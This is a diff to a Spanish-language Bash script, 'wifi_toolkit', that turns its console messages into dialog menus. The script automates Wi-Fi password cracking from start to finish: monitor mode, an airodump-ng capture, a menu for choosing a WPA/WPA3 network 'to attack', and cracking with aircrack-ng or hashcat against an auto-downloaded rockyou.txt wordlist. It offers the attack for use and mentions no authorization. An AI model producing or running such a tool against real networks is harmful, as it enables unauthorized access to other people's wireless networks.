@@ -12,59 +12,60 @@ PROJECT_NAME="wifi_toolkit"
 DOWNLOADS_DIR="$HOME/Downloads"
 PROJECT_DIR="$DOWNLOADS_DIR/$PROJECT_NAME"
 RESULTS_DIR="$PROJECT_DIR/resultados_wifi"
-DEPENDENCIES=("aircrack-ng" "xterm" "iw" "curl" "gzip" "hashcat")
+DEPENDENCIES=("aircrack-ng" "xterm" "iw" "curl" "gzip" "hashcat" "dialog")
 
-# Función: Limpiar pantalla con scroll visible
-clear_screen() {
-    clear
-    echo -e "${BLUE}-------------------------------------------------------------${NC}"
+# Mostrar barra de progreso
+show_progress() {
+    local duration=$1
+    local completed=0
+    local increment=$((100 / duration))
+
+    while [ $completed -le 100 ]; do
+        dialog --gauge "Procesando..." 10 50 $completed
+        sleep 1
+        ((completed += increment))
+    done
 }
 
 # Verificar permisos de administrador
 check_permissions() {
     if [[ $EUID -ne 0 ]]; then
-        clear_screen
-        echo -e "${RED}[-] Este script debe ejecutarse como administrador. Usa 'sudo'.${NC}"
+        dialog --title "Error" --msgbox "Este script debe ejecutarse como administrador. Usa 'sudo'." 8 40
         exit 1
     fi
 }
 
 # Crear carpetas de proyecto y resultados
 prepare_project_directory() {
-    clear_screen
-    echo -e "${BLUE}[+] Verificando carpetas necesarias...${NC}"
     for dir in "$PROJECT_DIR" "$RESULTS_DIR"; do
         if [[ ! -d "$dir" ]]; then
-            echo -e "${YELLOW}[!] La carpeta $dir no existe. Creándola...${NC}"
-            mkdir -p "$dir" || { echo -e "${RED}[-] Error al crear la carpeta $dir.${NC}"; exit 1; }
-            chmod 755 "$dir"
-            echo -e "${GREEN}[+] Carpeta creada: $dir${NC}"
-        else
-            echo -e "${GREEN}[+] La carpeta ya existe: $dir${NC}"
+            mkdir -p "$dir" || { dialog --title "Error" --msgbox "Error al crear la carpeta $dir." 8 40; exit 1; }
         fi
     done
 }
 
 # Verificar e instalar dependencias
 install_dependencies() {
-    clear_screen
-    echo -e "${BLUE}[+] Verificando dependencias necesarias...${NC}"
+    dialog --title "Instalación de dependencias" --infobox "Verificando dependencias..." 8 40
+    show_progress 5
+
     for dep in "${DEPENDENCIES[@]}"; do
         if ! command -v $dep &>/dev/null; then
-            echo -e "${RED}[-] Dependencia '$dep' no encontrada. Instalando...${NC}"
-            apt-get install -y $dep || { echo -e "${RED}[-] Error al instalar '$dep'.${NC}"; exit 1; }
-        else
-            echo -e "${GREEN}[+] '$dep' ya está instalado.${NC}"
+            dialog --title "Instalación de dependencias" --infobox "Instalando $dep..." 8 40
+            apt-get install -y $dep &>/dev/null || {
+                dialog --title "Error" --msgbox "Error al instalar $dep." 8 40
+                exit 1
+            }
         fi
     done
-    sleep 2
+    dialog --title "Dependencias" --msgbox "Todas las dependencias están instaladas." 8 40
 }
 
 # Detectar interfaces inalámbricas
 detect_wireless_interface() {
     interface=$(iw dev | grep Interface | awk '{print $2}' | head -n 1)
     if [[ -z "$interface" ]]; then
-        echo -e "${RED}[-] No se encontró ninguna interfaz inalámbrica.${NC}"
+        dialog --title "Error" --msgbox "No se encontró ninguna interfaz inalámbrica." 8 40
         exit 1
     fi
     echo "$interface"
@@ -72,68 +73,49 @@ detect_wireless_interface() {
 
 # Gestión del modo monitor
 enable_monitor_mode() {
-    clear_screen
     interface=$(detect_wireless_interface)
-    echo -e "${BLUE}[+] Detectando interfaces inalámbricas...${NC}"
-    echo -e "${BLUE}[+] Activando modo monitor en $interface...${NC}"
+    dialog --title "Modo Monitor" --infobox "Activando modo monitor en $interface..." 8 40
     sleep 1
-    echo -e "${YELLOW}[!] Esto puede tardar unos segundos...${NC}"
-    airmon-ng start $interface || iw dev $interface set type monitor
-    echo -e "${GREEN}[+] Modo monitor activado en $interface.${NC}"
-    sleep 2
+    airmon-ng start $interface &>/dev/null || iw dev $interface set type monitor &>/dev/null
+    dialog --title "Modo Monitor" --msgbox "Modo monitor activado en $interface." 8 40
 }
 
 # Escaneo de redes
 scan_networks() {
-    clear_screen
     interface=$(detect_wireless_interface)
-    echo -e "${BLUE}[+] Usando la interfaz: $interface${NC}"
-    echo -e "${BLUE}[+] Iniciando escaneo de redes WiFi durante 60 segundos...${NC}"
-    echo -e "${YELLOW}[!] Por favor, espera mientras se recopilan datos.${NC}"
+    dialog --title "Escaneo de Redes" --infobox "Escaneando redes durante 60 segundos..." 8 40
+    show_progress 60
+
     xterm -hold -e "airodump-ng $interface --output-format cap --write $RESULTS_DIR/scan_results" &
     sleep 60
     killall airodump-ng
-    echo -e "${GREEN}[+] Escaneo completado. Resultados guardados en $RESULTS_DIR.${NC}"
-    sleep 2
+    dialog --title "Escaneo de Redes" --msgbox "Escaneo completado. Resultados guardados en $RESULTS_DIR." 8 40
 }
 
-# Analizar archivo .cap y recomendar redes (incluye WPA3)
+# Analizar archivo .cap y recomendar redes
 analyze_cap_file() {
-    clear_screen
-    echo -e "${BLUE}[+] Analizando archivo .cap para recomendar redes...${NC}"
     cap_file=$(find $RESULTS_DIR -type f -name "*.cap" 2>/dev/null | head -n 1)
-
     if [[ -z "$cap_file" ]]; then
-        echo -e "${RED}[-] No se encontró ningún archivo .cap en la carpeta de resultados.${NC}"
+        dialog --title "Error" --msgbox "No se encontró ningún archivo .cap en la carpeta de resultados." 8 40
         return
     fi
 
-    echo -e "${GREEN}[+] Archivo .cap encontrado: $cap_file${NC}"
-    echo -e "${BLUE}[+] Extrayendo redes disponibles...${NC}"
-    sleep 1
+    dialog --title "Analizando Archivo" --infobox "Analizando archivo .cap para extraer redes vulnerables..." 8 40
+    show_progress 5
 
-    echo -e "${YELLOW}[+] Buscando redes WPA y WPA3...${NC}"
-    sleep 1
-    recommended_networks=$(aircrack-ng $cap_file | grep -E "WPA|WPA3" | awk '{print $3, $4, $5}')
-
-    if [[ -z "$recommended_networks" ]]; then
-        echo -e "${RED}[-] No se encontraron redes vulnerables en el archivo .cap.${NC}"
+    networks=$(aircrack-ng $cap_file | grep -E "WPA|WPA3" | awk '{print $3, $4, $5}')
+    if [[ -z "$networks" ]]; then
+        dialog --title "Análisis de Redes" --msgbox "No se encontraron redes vulnerables." 8 40
         return
     fi
 
-    echo -e "${BLUE}[+] Redes recomendadas para ataque:${NC}"
-    select network in $recommended_networks "Salir"; do
-        if [[ "$network" == "Salir" ]]; then
-            echo -e "${RED}[-] Saliendo del análisis.${NC}"
-            return
-        elif [[ -n "$network" ]]; then
-            echo -e "${GREEN}[+] Red seleccionada para ataque: $network${NC}"
-            perform_attack $network
-            break
-        else
-            echo -e "${RED}[-] Selección inválida. Inténtalo nuevamente.${NC}"
-        fi
-    done
+    selected_network=$(dialog --title "Redes Encontradas" --menu "Selecciona una red para atacar:" 15 50 5 $(echo "$networks" | nl) 3>&1 1>&2 2>&3)
+    if [[ -z "$selected_network" ]]; then
+        dialog --title "Análisis de Redes" --msgbox "No se seleccionó ninguna red." 8 40
+        return
+    fi
+
+    perform_attack "$selected_network"
 }
 
 # Realizar ataque contra red seleccionada
@@ -141,62 +123,57 @@ perform_attack() {
     local network=$1
     dictionary=$(find_rockyou_dictionary)
 
-    echo -e "${BLUE}[+] Preparando ataque contra la red: $network${NC}"
-    sleep 1
-    echo -e "${YELLOW}[!] Esto puede tardar un tiempo dependiendo de la red.${NC}"
-
     if [[ "$network" == *"WPA3"* ]]; then
-        echo -e "${BLUE}[+] WPA3 detectado. Usando hashcat para el ataque.${NC}"
-        sleep 1
-        echo -e "${YELLOW}[+] Ejecutando hashcat...${NC}"
+        dialog --title "Ataque WPA3" --infobox "Iniciando ataque con hashcat..." 8 40
+        show_progress 30
         xterm -hold -e "hashcat -m 22000 $RESULTS_DIR/scan_results*.cap $dictionary" &
     else
-        echo -e "${YELLOW}[+] Ejecutando aircrack-ng...${NC}"
-        sleep 1
+        dialog --title "Ataque WPA/WPA2" --infobox "Iniciando ataque con aircrack-ng..." 8 40
+        show_progress 20
         xterm -hold -e "aircrack-ng -w $dictionary -b $network $RESULTS_DIR/scan_results*.cap" &
     fi
     sleep 2
+    dialog --title "Ataque Completado" --msgbox "El ataque se ha completado. Revisa los resultados." 8 40
 }
 
 # Buscar diccionario rockyou.txt en todo el sistema
 find_rockyou_dictionary() {
-    clear_screen
-    echo -e "${BLUE}[+] Buscando diccionario 'rockyou.txt' en el sistema...${NC}"
     dictionary_path=$(find / -type f -name "rockyou.txt" 2>/dev/null | head -n 1)
-
     if [[ -z "$dictionary_path" ]]; then
-        echo -e "${YELLOW}[!] Diccionario 'rockyou.txt' no encontrado. Descargando automáticamente...${NC}"
+        dialog --title "Diccionario" --infobox "Descargando diccionario rockyou.txt..." 8 40
+        show_progress 10
         curl -o "$PROJECT_DIR/rockyou.txt.gz" https://github.com/praetorian-inc/Hob0Rules/raw/master/wordlists/rockyou.txt.gz
         gzip -d "$PROJECT_DIR/rockyou.txt.gz"
         dictionary_path="$PROJECT_DIR/rockyou.txt"
-        echo -e "${GREEN}[+] Diccionario descargado y descomprimido en $dictionary_path${NC}"
-    else
-        echo -e "${GREEN}[+] Diccionario encontrado en: $dictionary_path${NC}"
     fi
-
     echo "$dictionary_path"
+}
+
+# Mostrar resumen detallado
+show_summary() {
+    dialog --title "Resumen Final" --msgbox "Resumen de la operación:\n\n- Escaneo realizado: Sí\n- Redes analizadas: WPA/WPA3\n- Resultados guardados en: $RESULTS_DIR\n- Diccionario usado: $(find_rockyou_dictionary)" 15 50
 }
 
 # Menú principal
 main_menu() {
     while true; do
-        clear_screen
-        echo -e "${BLUE}[=]==================== Menú Principal ====================[=]${NC}"
-        echo -e "${GREEN}1.${NC} Verificar e instalar dependencias"
-        echo -e "${GREEN}2.${NC} Habilitar modo monitor"
-        echo -e "${GREEN}3.${NC} Escanear redes"
-        echo -e "${GREEN}4.${NC} Analizar archivo .cap y realizar ataque"
-        echo -e "${GREEN}5.${NC} Salir"
-        echo -e "${BLUE}[=]=====================================================[=]${NC}"
-        read -p "Selecciona una opción: " option
+        option=$(dialog --title "WiFi Toolkit" --menu "Selecciona una opción:" 15 50 6 \
+            1 "Instalar dependencias" \
+            2 "Habilitar modo monitor" \
+            3 "Escanear redes" \
+            4 "Analizar archivo .cap y realizar ataque" \
+            5 "Ver detalles del diccionario" \
+            6 "Salir" 3>&1 1>&2 2>&3)
 
         case $option in
             1) install_dependencies ;;
             2) enable_monitor_mode ;;
             3) scan_networks ;;
             4) analyze_cap_file ;;
-            5) echo -e "${RED}[-] Saliendo...${NC}"; exit 0 ;;
-            *) echo -e "${RED}[-] Opción no válida.${NC}"; sleep 2 ;;
+            5) dictionary_path=$(find_rockyou_dictionary)
+               dialog --title "Detalles del Diccionario" --msgbox "Ruta del diccionario: $dictionary_path" 10 50 ;;
+            6) show_summary; clear; exit 0 ;;
+            *) dialog --title "Error" --msgbox "Opción inválida." 8 40 ;;
         esac
     done
 }
